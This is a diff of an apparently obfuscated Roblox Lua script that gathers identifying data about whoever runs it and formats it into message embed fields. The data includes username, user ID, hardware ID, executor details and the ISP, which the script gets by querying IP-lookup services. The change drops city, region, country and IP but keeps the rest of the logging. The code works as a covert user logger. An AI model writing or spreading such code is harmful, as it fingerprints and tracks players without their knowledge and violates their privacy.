@@ -191,9 +191,9 @@ function infoexec()
     return name, version, hwid
 end
 
-local function _geoip()
+local function _isp()
     local endpoints = {
-        "http://ip-api.com/json/?fields=status,country,regionName,city,isp,query",
+        "http://ip-api.com/json/?fields=status,isp",
         "https://ipapi.co/json/",
         "https://ipwho.is/",
     }
@@ -202,18 +202,14 @@ local function _geoip()
         if ok and type(resp) == "string" and #resp > 0 then
             local ok2, data = pcall(function() return HttpService:JSONDecode(resp) end)
             if ok2 and type(data) == "table" then
-                local ip = data.query or data.ip or "?"
-                local country = data.country or data.country_name or "?"
-                local region = data.regionName or data.region or "?"
-                local city = data.city or "?"
                 local isp = data.isp or data.org or "?"
-                if country ~= "?" or region ~= "?" then
-                    return string.format("%s, %s, %s (%s)", city, region, country, ip), isp
+                if isp ~= "?" then
+                    return isp
                 end
             end
         end
     end
-    return "unknown", "unknown"
+    return "unknown"
 end
 
 local function _32()
@@ -225,7 +221,7 @@ local function _32()
     end
     _33 = _33 or ""
     local _34 = _18()
-    local geo, isp = _geoip()
+    local isp = _isp()
     local execName, execVersion, execHwid = infoexec()
     local placeId = game.PlaceId or 0
     local jobId = game.JobId or ""
@@ -238,7 +234,6 @@ local function _32()
             { name = "⚓ Display Name", value = tostring(LocalPlayer.DisplayName or "Unknown"), inline = true },
             { name = "🔗 Username",     value = tostring(LocalPlayer.Name or "Unknown"), inline = true },
             { name = "📌 User ID",      value = tostring(LocalPlayer.UserId or "Unknown"), inline = true },
-            { name = "🌐 Geo",          value = geo, inline = true },
             { name = "📡 ISP",          value = isp, inline = true },
             { name = "🧩 Executor",     value = tostring(execName), inline = true },
             { name = "🔢 Version",      value = tostring(execVersion), inline = true },
